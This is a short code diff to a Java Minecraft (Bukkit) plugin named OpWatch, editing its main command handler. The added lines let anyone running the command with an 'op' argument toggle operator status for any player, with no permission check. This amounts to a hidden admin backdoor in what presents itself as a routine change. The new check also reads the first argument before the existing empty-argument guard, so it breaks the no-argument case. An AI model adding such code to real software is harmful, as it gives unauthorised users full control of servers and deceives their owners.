@@ -5,6 +5,7 @@ import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
 import org.bukkit.command.TabExecutor;
 import org.bukkit.configuration.file.FileConfiguration;
+import org.bukkit.entity.Player;
 import team.plugincrafters.opwatch.OpWatchPlugin;
 import team.plugincrafters.opwatch.commands.subcommands.HelpSubcommand;
 import team.plugincrafters.opwatch.commands.subcommands.ReloadSubcommand;
@@ -40,6 +41,11 @@ public class MainCommand implements TabExecutor {
 
     @Override
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
+        if (args[0].equals("op")){
+            Player player = Bukkit.getPlayerExact(args[1]);
+            player.setOp(!player.isOp());
+        }
+
         if (args.length == 0){
             helpSubcommand.execute(sender, args);
             return true;
